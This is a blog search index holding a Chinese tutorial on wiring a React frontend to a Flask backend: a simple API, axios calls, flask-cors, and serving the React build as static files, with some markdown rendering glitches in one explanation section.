<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>React+Flask后端分离开发</title>
      <link href="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/"/>
      <url>/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="一、动机"><a href="#一、动机" class="headerlink" title="一、动机"></a>一、动机</h1><p>通过 <strong>React</strong>（前端框架）和 <strong>Flask</strong>（后端框架）构建一个初始网站，可以结合它们的优势，前端负责交互界面，后端提供 API 接口。</p><h1 id="二、准备环境"><a href="#二、准备环境" class="headerlink" title="二、准备环境"></a>二、准备环境</h1><h2 id="2-1-安装必要工具"><a href="#2-1-安装必要工具" class="headerlink" title="2.1 安装必要工具"></a>2.1 安装必要工具</h2><ul><li>确保安装了 <a href="https://nodejs.org/">Node.js</a> 和 npm，用于管理 React 项目。</li><li>确保安装了 Python（推荐 3.8 及以上版本）和 pip，用于管理 Flask 项目。</li></ul><blockquote><h3 id="npm是什么？"><a href="#npm是什么？" class="headerlink" title="npm是什么？"></a>npm是什么？</h3><p>npm 是 Node Package Manager（节点包管理器）的缩写，它是 JavaScript 运行时环境 Node.js 的默认包管理器。</p><p>npm 用于管理和安装 Node.js 应用程序所需的各种代码库和工具，这些代码库和工具被称为“包”或“模块”。</p><p>以下是 npm 的一些主要功能：</p><ol><li><strong>依赖管理</strong>：npm 允许你为你的项目定义依赖关系，并通过 <code>package.json</code> 文件来管理这些依赖。这使得项目可以轻松地在不同的开发环境中共享和部署。</li><li><strong>包安装</strong>：你可以使用 npm 来安装项目所需的包。这些包可以是第三方库，也可以是你自己的代码模块。</li><li><strong>版本控制</strong>：npm 支持语义化版本控制，允许你指定依赖的版本范围，以确保兼容性。</li><li><strong>包发布</strong>：开发者可以将自己的包发布到 npm 的公共仓库，供其他开发者使用。</li><li><strong>全局安装</strong>：npm 允许你全局安装包，这样你就可以在任何地方使用这些工具，而不需要在每个项目中单独安装。</li><li><strong>脚本</strong>：<code>package.json</code> 文件中的 <code>scripts</code> 字段允许你定义自定义脚本，这些脚本可以通过 <code>npm run &lt;script-name&gt;</code> 来执行。</li><li><strong>工作区</strong>：npm 支持工作区，允许你在多个包之间共享配置和依赖。</li></ol></blockquote><h1 id="三、创建-Flask-后端"><a href="#三、创建-Flask-后端" class="headerlink" title="三、创建 Flask 后端"></a>三、创建 Flask 后端</h1><h2 id="3-1-创建-Flask-项目"><a href="#3-1-创建-Flask-项目" class="headerlink" title="3.1 创建 Flask 项目"></a>3.1 创建 Flask 项目</h2><p>初始化 Flask 项目目录：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> flask-backend<span class="token builtin class-name">cd</span> flask-backend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="3-2-创建虚拟环境并激活"><a href="#3-2-创建虚拟环境并激活" class="headerlink" title="3.2 创建虚拟环境并激活"></a>3.2 创建虚拟环境并激活</h2><p>conda 或 venv</p><h3 id="3-2-1-anaconda"><a href="#3-2-1-anaconda" class="headerlink" title="3.2.1 anaconda"></a>3.2.1 anaconda</h3><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-09%2017.27.59.png" style="zoom:50%;"><h3 id="3-2-2-venv"><a href="#3-2-2-venv" class="headerlink" title="3.2.2 venv"></a>3.2.2 venv</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-m</span> venv venv<span class="token builtin class-name">source</span> venv/bin/activate   <span class="token comment"># Windows: venv\Scripts\activate</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-2-3-安装-Flask"><a href="#3-2-3-安装-Flask" class="headerlink" title="3.2.3 安装 Flask"></a>3.2.3 安装 Flask</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> flask<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-4-创建-app-py-文件"><a href="#3-2-4-创建-app-py-文件" class="headerlink" title="3.2.4 创建 app.py 文件"></a>3.2.4 创建 <code>app.py</code> 文件</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> jsonifyapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/api/message'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Hello from Flask!"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-5-启动-Flask-服务器"><a href="#3-2-5-启动-Flask-服务器" class="headerlink" title="3.2.5 启动 Flask 服务器"></a>3.2.5 启动 Flask 服务器</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python app.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-09%2017.34.25.png" style="zoom:50%;"><p>访问 <code>http://127.0.0.1:5000/api/message</code>：</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-09%2017.35.40.png" style="zoom:50%;"><h1 id="四、创建-React-前端"><a href="#四、创建-React-前端" class="headerlink" title="四、创建 React 前端"></a>四、创建 React 前端</h1><h2 id="4-1-初始化-React-项目"><a href="#4-1-初始化-React-项目" class="headerlink" title="4.1 初始化 React 项目"></a>4.1 初始化 React 项目</h2><p>在另一个目录中创建 React 项目</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npx create-react-app react-frontend<span class="token builtin class-name">cd</span> react-frontend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><ul><li>命令解析：</li></ul><p>**<code>npx</code>**是 npm 的一部分，用于运行 npm 包而无需全局安装它们。</p><p>**<code>create-react-app</code>**是 React 官方提供的脚手架工具，用于快速搭建 React 项目的初始结构。</p><p>**<code>react-frontend</code>**是项目的目录名称，你可以根据需要自定义，例如 <code>my-react-app</code>。</p></blockquote><blockquote><p> 报错：</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-09%2017.44.29.png" alt="截屏2024-12-09 17.44.29" style="zoom:50%;"><p>try：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> config <span class="token builtin class-name">set</span> legacy-peer-deps <span class="token boolean">true</span><span class="token function">npm</span> i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>参考：<a href="https://stackoverflow.com/questions/72596908/could-not-resolve-dependency-error-peer-react16-8-0-17-0-0-from-materia">https://stackoverflow.com/questions/72596908/could-not-resolve-dependency-error-peer-react16-8-0-17-0-0-from-materia</a></p><p><code>npm config set legacy-peer-deps true</code></p><p>这条命令用于配置 <strong>npm</strong> 使用 “legacy peer dependencies” 机制来解决依赖冲突。具体来说：</p><ol><li><strong><code>peer dependencies</code></strong><br>是指某个 npm 包对其他包的版本要求，它并不直接安装这些依赖，而是由使用该包的项目来安装。它用于确保在多个包中共享同一版本的依赖。</li><li><strong>“legacy peer dependencies”</strong><br>在 npm 7 版本及之后，npm 会强制执行严格的 <code>peer dependencies</code> 规则。若存在不兼容的版本，npm 会拒绝安装。这可能导致一些旧项目的依赖安装失败，特别是一些老旧的 npm 包没有更新以适应这些新规则。</li><li><strong><code>npm config set legacy-peer-deps true</code></strong><br>这条命令设置 npm 配置，指示 npm 在安装时忽略 <code>peer dependencies</code> 的严格检查，允许安装不完全匹配的版本。这对于那些依赖较旧的 npm 包（或者在升级后依赖有冲突的情况）特别有用。</li></ol><p><code>npm i</code> (或 <code>npm install</code>)**</p><p>这是用于安装项目依赖的命令，它会按照项目根目录下的 <code>package.json</code> 文件来安装所有列出的依赖。</p><ul><li>在执行 <code>npm i</code> 时，npm 会下载并安装依赖到项目的 <code>node_modules</code> 目录。</li><li>如果你在之前执行过 <code>npm config set legacy-peer-deps true</code>，npm 会在安装过程中忽略 <code>peer dependencies</code> 的严格检查，允许版本冲突的依赖继续安装。</li></ul></blockquote><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-09%2017.51.41.png" style="zoom:40%;"><p>启动服务并访问测试：</p><p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2009.18.39.png" alt="截屏2024-12-10 09.18.39"></p><p>bug处理：</p><blockquote><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2009.21.15.png" alt="截屏2024-12-10 09.21.15" style="zoom:50%;"><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-09%2017.53.02.png" alt="截屏2024-12-09 17.53.02" style="zoom:50%;"><p>安装缺失的库。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">npm install <span class="token operator">--</span>save<span class="token operator">-</span>dev web<span class="token operator">-</span>vitals<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>重新运行npm start启动前端项目。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2009.22.17.png" style="zoom:30%;"><h2 id="4-2-修改-React-项目以调用-Flask-API"><a href="#4-2-修改-React-项目以调用-Flask-API" class="headerlink" title="4.2 修改 React 项目以调用 Flask API"></a>4.2 修改 React 项目以调用 Flask API</h2><h3 id="4-2-1-安装-axios（用于发起-HTTP-请求）"><a href="#4-2-1-安装-axios（用于发起-HTTP-请求）" class="headerlink" title="4.2.1 安装 axios（用于发起 HTTP 请求）"></a>4.2.1 安装 <code>axios</code>（用于发起 HTTP 请求）</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> axios<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2009.27.40.png" style="zoom:50%;"><h3 id="4-2-2-在-src-App-js-中编辑代码"><a href="#4-2-2-在-src-App-js-中编辑代码" class="headerlink" title="4.2.2 在 src/App.js 中编辑代码"></a>4.2.2 在 <code>src/App.js</code> 中编辑代码</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> React<span class="token punctuation">,</span> <span class="token punctuation">{</span> useState<span class="token punctuation">,</span> useEffect <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span><span class="token keyword">import</span> axios <span class="token keyword">from</span> <span class="token string">'axios'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token punctuation">[</span>message<span class="token punctuation">,</span> setMessage<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>        <span class="token comment">// 调用 Flask API</span>        axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'http://127.0.0.1:5000/api/message'</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=&gt;</span> <span class="token function">setMessage</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>data<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">error</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"Error fetching data:"</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>        <span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token literal-property property">textAlign</span><span class="token operator">:</span> <span class="token string">'center'</span><span class="token punctuation">,</span> <span class="token literal-property property">marginTop</span><span class="token operator">:</span> <span class="token string">'50px'</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>h1<span class="token operator">&gt;</span>React <span class="token operator">+</span> Flask 初始页面<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span><span class="token punctuation">{</span>message <span class="token operator">||</span> <span class="token string">"Loading..."</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>        <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ul><li>代码解析：</li></ul><p> 这段代码是一个简单的 React 组件，它使用 axios 库从一个 Flask API 获取数据。下面是代码的逐行解释：</p><ol><li><p>import React, { useState, useEffect } from ‘react’;<br>这行代码从 react 库中导入了 React 对象、useState 钩子和 useEffect 钩子。useState 用于在函数组件中添加状态，useEffect 用于处理副作用（例如，数据获取、订阅或手动更改 React 组件中的 DOM）。</p></li><li><p>import axios from ‘axios’;<br>这行代码导入了 axios，这是一个基于 Promise 的 HTTP 客户端，用于浏览器和 node.js，用于向后端发送请求。</p></li><li><p>function App() { … }<br>定义了一个名为 App 的函数组件。</p></li><li><p>const [message, setMessage] = useState(‘’);<br>使用 useState 钩子创建了一个名为 message 的状态变量和一个名为 setMessage 的函数，用于更新这个状态。初始值设置为空字符串。</p></li><li><p>useEffect(() =&gt; { … }, []);<br>useEffect 钩子用于在组件加载后执行副作用。这里的效果是调用 Flask API 获取消息。空数组 [] 作为第二个参数表示这个效果仅在组件首次渲染时运行。</p></li><li><p>axios.get(‘<a href="http://127.0.0.1:5000/api/message">http://127.0.0.1:5000/api/message</a>‘)<br>使用 axios 发送一个 GET 请求到 <a href="http://127.0.0.1:5000/api/message">http://127.0.0.1:5000/api/message</a> 这个 URL。这个 URL 应该是你的 Flask 应用提供的 API 端点。</p></li><li><p>.then(response =&gt; setMessage(response.data.message))<br>如果请求成功，.then 方法会处理响应。这里将响应中的 message 数据赋值给状态变量 message。</p></li><li><p>.catch(error =&gt; console.error(“Error fetching data:”, error));<br>如果请求失败，.catch 方法会捕获错误，并在控制台打印错误信息。</p></li><li><p>return ( … );<br>这是 React 组件的返回语句，它定义了组件的 JSX 结构，即组件在页面上呈现的内容。</p></li><li><pre><code class="html">&lt;div style={{ textAlign: 'center', marginTop: '50px' }}&gt; ... &lt;/div&gt;<pre class="line-numbers language-none"><code class="language-none">    + 返回一个 div 元素，其中包含一些内联样式：文本居中和上边距为 50px。11. ```html    &lt;h1&gt;React + Flask 初始页面&lt;/h1&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>+ 在 div 内部，有一个标题元素 h1，显示文本 “React + Flask 初始页面”。</code></pre></li><li><pre><code class="html">&lt;p&gt;{message || "Loading..."}&lt;/p&gt;<pre class="line-numbers language-none"><code class="language-none">    + 一个段落元素 p 显示 message 状态的值。如果 message 是空的（即正在加载中），则显示 “Loading…”。      整体来看，这段代码创建了一个 React 组件，该组件在加载时从 Flask API 获取一条消息，并将其显示在页面上。如果消息尚未加载，页面将显示 “Loading…”。&lt;img src="React+Flask%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%BC%80%E5%8F%91/%E6%88%AA%E5%B1%8F2024-12-10%2009.49.10.png" alt="截屏2024-12-10 09.49.10" style="zoom:50%;" /&gt;### 4.2.3 访问测试![截屏2024-12-10 09.53.06](React+Flask%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%BC%80%E5%8F%91/%E6%88%AA%E5%B1%8F2024-12-10%2009.53.06.png)前端执行成功，但是后端的message数据请求失败。原因：同源策略限制（React端口3000，Flask端口5000）。# 五、跨域请求设置## 5.1 设置 Flask 支持跨域请求安装 Flask-CORS：```bashpip install flask-cors<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></code></pre></li></ol></blockquote><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2009.56.47.png" style="zoom:50%;"><p>修改 <code>app.py</code>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask_cors <span class="token keyword">import</span> CORSapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>CORS<span class="token punctuation">(</span>app<span class="token punctuation">)</span>  <span class="token comment"># 允许跨域请求</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-2-测试验证"><a href="#5-2-测试验证" class="headerlink" title="5.2 测试验证"></a>5.2 测试验证</h2><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2009.59.41.png" alt="前后端联动测试成功" style="zoom:50%;"><h1 id="六、部署优化"><a href="#六、部署优化" class="headerlink" title="六、部署优化"></a>六、部署优化</h1><p><strong>开发环境</strong>：前后端分开运行。</p><p><strong>生产环境</strong>：可以使用 Flask 提供 React 构建后的静态文件。</p><h2 id="6-1-构建-React-项目"><a href="#6-1-构建-React-项目" class="headerlink" title="6.1 构建 React 项目"></a>6.1 构建 React 项目</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> run build<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>输出：</p><p>npm run build </p><blockquote><p><a href="mailto:react-frontend@0.1.0">react-frontend@0.1.0</a> build<br>react-scripts build</p></blockquote><p>Creating an optimized production build…<br>One of your dependencies, babel-preset-react-app, is importing the<br>“@babel/plugin-proposal-private-property-in-object” package without<br>declaring it in its dependencies. This is currently working because<br>“@babel/plugin-proposal-private-property-in-object” is already in your<br>node_modules folder for unrelated reasons, but it may break at any time.</p><p>babel-preset-react-app is part of the create-react-app project, which<br>is not maintianed anymore. It is thus unlikely that this bug will<br>ever be fixed. Add “@babel/plugin-proposal-private-property-in-object” to<br>your devDependencies to work around this error. This will make this message<br>go away.</p><p>Compiled successfully.</p><p>File sizes after gzip:</p><p>  73.28 kB  build/static/js/main.7d3412ba.js<br>  2.7 kB    build/static/js/488.ee97bdc1.chunk.js<br>  264 B     build/static/css/main.e6c13ad2.css</p><p>The project was built assuming it is hosted at /.<br>You can control this with the homepage field in your package.json.</p><p>The build folder is ready to be deployed.<br>You may serve it with a static server:</p><p>  npm install -g serve<br>  serve -s build</p><p>Find out more about deployment here:</p><p>  <a href="https://cra.link/deployment">https://cra.link/deployment</a></p></blockquote><h2 id="6-2-设置-Flask-提供静态文件服务"><a href="#6-2-设置-Flask-提供静态文件服务" class="headerlink" title="6.2 设置 Flask 提供静态文件服务"></a>6.2 设置 Flask 提供静态文件服务</h2><h3 id="6-2-1-将-build-文件夹复制到-Flask-项目目录"><a href="#6-2-1-将-build-文件夹复制到-Flask-项目目录" class="headerlink" title="6.2.1 将 build 文件夹复制到 Flask 项目目录"></a>6.2.1 将 <code>build</code> 文件夹复制到 Flask 项目目录</h3><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.06.17.png" alt="截屏2024-12-10 10.06.17" style="zoom:50%;"><p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.08.24.png" alt="截屏2024-12-10 10.08.24"></p><h3 id="6-2-3-设置-Flask-提供静态文件服务"><a href="#6-2-3-设置-Flask-提供静态文件服务" class="headerlink" title="6.2.3 设置 Flask 提供静态文件服务"></a>6.2.3 设置 Flask 提供静态文件服务</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> jsonify<span class="token punctuation">,</span> send_from_directory<span class="token keyword">from</span> flask_cors <span class="token keyword">import</span> CORSapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">,</span> static_folder<span class="token operator">=</span><span class="token string">'build'</span><span class="token punctuation">)</span>CORS<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">serve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> send_from_directory<span class="token punctuation">(</span>app<span class="token punctuation">.</span>static_folder<span class="token punctuation">,</span> <span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/api/message'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Hello from Flask!"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-2-4-访问测试"><a href="#6-2-4-访问测试" class="headerlink" title="6.2.4 访问测试"></a>6.2.4 访问测试</h3><p>启动 Flask 项目后，直接访问根路径 <code>http://127.0.0.1:5000</code>。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.15.20.png" style="zoom:50%;"><p>首页为空，静态资源下载失败。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.23.14.png" style="zoom:50%;"><h3 id="6-2-5-修改-package-json"><a href="#6-2-5-修改-package-json" class="headerlink" title="6.2.5 修改 package.json"></a>6.2.5 修改 <code>package.json</code></h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"homepage"</span><span class="token operator">:</span> <span class="token string">"."</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.26.43.png" alt="截屏2024-12-10 10.26.43" style="zoom:50%;"><p>重新构建项目：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> run build<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重新测试：</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.28.54.png" alt="截屏2024-12-10 10.28.54" style="zoom:50%;"><p>仍然失败。</p><h3 id="6-2-6-问题进一步分析"><a href="#6-2-6-问题进一步分析" class="headerlink" title="6.2.6 问题进一步分析"></a>6.2.6 问题进一步分析</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://127.0.0.1:5000/build/static/css/main.e6c13ad2.css<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.31.55.png" alt="截屏2024-12-10 10.31.55" style="zoom:50%;"><p>添加build目录能够成功访问。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.35.37.png" style="zoom:50%;"><h3 id="6-2-7-问题解决"><a href="#6-2-7-问题解决" class="headerlink" title="6.2.7 问题解决"></a>6.2.7 问题解决</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">,</span> static_folder<span class="token operator">=</span><span class="token string">'build'</span><span class="token punctuation">,</span> static_url_path<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加配置：static_url_path=’’</p><h2 id="6-3-访问测试"><a href="#6-3-访问测试" class="headerlink" title="6.3 访问测试"></a>6.3 访问测试</h2><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.38.20.png" style="zoom:50%;"><p>至此，成功完成一个Flask+React的Demo系统。</p><p>进阶技能，后续继续加以学习。</p><h1 id="目录结构总结"><a href="#目录结构总结" class="headerlink" title="目录结构总结"></a>目录结构总结</h1><p>前端：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">react-frontend/├── public/├── src/│   ├── App.js│   ├── index.js├── package.json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>后端：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flask-backend/├── app.py├── venv/├── build/ <span class="token punctuation">(</span>React 构建的静态文件<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 前后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前后端开发 </tag>
            
            <tag> React和Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React前端框架</title>
      <link href="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/"/>
      <url>/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/</url>
      
